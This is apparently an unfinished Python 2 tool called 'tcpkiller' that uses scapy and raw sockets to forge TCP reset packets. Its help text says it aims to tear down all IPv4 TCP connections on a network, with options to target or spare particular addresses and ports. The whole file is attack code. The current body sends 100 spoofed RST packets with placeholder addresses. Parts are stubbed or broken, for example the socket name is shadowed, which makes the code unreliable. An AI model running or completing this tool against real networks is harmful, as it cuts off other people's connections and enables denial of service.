#!/usr/bin/env python

import binascii
import socket
import struct
import argparse
import sys
import logging
import os

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import Ether, IP, TCP, sendp, conf, sniff
from socket import socket, PF_PACKET, SOCK_RAW

###############################################################
# Handle Arguements                                           #
###############################################################

def args_error():
    parser.print_usage()
    sys.exit()

def validate_ips(ips):
    for ip in ips:
        if "," in ip:
            ips += filter(None, ip.split(","))
        else:
            try:
                socket.inet_aton(ip)
            except socket.error:
                print("error: invalid ip address \"%s\", exiting." % ip)
                return False
    return True

def is_int(s):
    try: 
        int(s)
        return True
    except ValueError:
        return False

def validate_ports(ports):
    for port in ports:
        if "," in port:
            ports += port.split(",")
        elif "-" in port:
            low, high = port.split("-")
            if not is_int(low) or not is_int(high):
                print("error: invalid port range \"%s\", exiting." % port)
                return False
        elif not is_int(port):
            return False
    return True

def validate_args(args):
    for arg in ["allow", "allow_source", "allow_destination", "target", "target_source", "target_destination"]:
        if arg in args and args[arg] != None and not validate_ips(args[arg]):
            args_error()
    for arg in ["allow_port", "allow_source_port", "allow_destination_port", "target_port", "target_source_port", "target_destination_port"]: 
        if arg in args and args[arg] != None and not validate_ports(args[arg]):
            args_error()
    #if args["iface"] == None:
        
VERBOSE = False
allow = allow_source = allow_destination = []
target = target_source = target_destination = []
aports = allow_sport = allow_dport = []
tports = target_sport = target_dport = []
ranges = {}

parser = argparse.ArgumentParser(description="Attempts to reset all ipv4 tcp connections.", epilog="tcpkiller must be run as root. If no targets [-t|-ts|-td] are given, default is to attack all seen tcp connections.")
parser.add_argument('-i', '--interface', required=True, help="interface to listen and send on")
parser.add_argument('-a', '--allow', nargs="*", help="do not attack this ip address's connections, whether it's the source or destination of a packet",metavar='')
parser.add_argument('-as', '--allow-source', nargs="*", help="do not attack this ip address's connections, but only if it's the source of a packet",metavar='')
parser.add_argument('-ad', '--allow-destination', nargs="*", help="do not attack this ip address's connections, but only if it's the destination of a packet",metavar='')
parser.add_argument('-t', '--target', nargs="*", help="actively target given ip address, whether it is the source or destination of a packet",metavar='')
parser.add_argument('-ts', '--target-source', nargs="*", help="actively target this ip address, but only if it's the source",metavar='')
parser.add_argument('-td', '--target-destination', nargs="*", help="actively target this ip address, but only if it's the destination of a packet",metavar='')
parser.add_argument('-q', '--allow-port', nargs="*", help="do not attack any connections involving this port, whether it's the source or destination of a packet",metavar='')
parser.add_argument('-qs', '--allow-source-port', nargs="*", help="do not attack any connections involving this port, but only if it's the source of a packet",metavar='')
parser.add_argument('-qd', '--allow-destination-port', nargs="*", help="do not attack any connections involving this port, but only if it's the destination of a packet",metavar='')
parser.add_argument('-p', '--target-port', nargs="*", help="actively target any connections involving these ports whether it is the source or destination of a packet",metavar='')
parser.add_argument('-ps', '--target-source-port', nargs="*", help="actively target any connections involving this port, but only if it's the source",metavar='')
parser.add_argument('-pd', '--target-destination-port', nargs="*", help="actively target any connections involving this port, but only if it's the destination of a packet",metavar='')
parser.add_argument('-v', '--verbose', help="verbose output", default=False, action="store_true")

if __name__ == "__main__":
    if os.getuid()!=0:
        print "error: not running as root."
        parser.print_usage()
        sys.exit()

args = vars(parser.parse_args())
validate_args(args)

iface = args["interface"]

###############################################################
# Packet Handling                                             #
###############################################################

# Given command line arguements, method determines if this packet should be responded to
def ignore_packet(packet):
    pass

def send(packet):
    socket.send(packet)

def build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq):
    eth = Ether(src=src_mac, dst=dst_mac, type=0x800)
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=src_port, dport=dst_port, seq=seq, flags="R")
    return str(eth/ip/tcp)

###############################################################
# Scapy                                                       #
###############################################################

def callback(packet):
    print packet.show()
    #if not packet[TCP].flags == 4L:
    #    pass

socket = socket(PF_PACKET, SOCK_RAW)
socket.bind((iface, 0))
for i in range(0,100):
    send(build_packet("aa:bb:cc:dd:ee:ff", "aa:bb:cc:dd:ee:ff", "1.1.1.1", "1.1.1.1", 124, 1241, 4))

#conf.sniff_promisc = True
#sniff(filter='tcp', prn=callback, store=0)

socket.close()
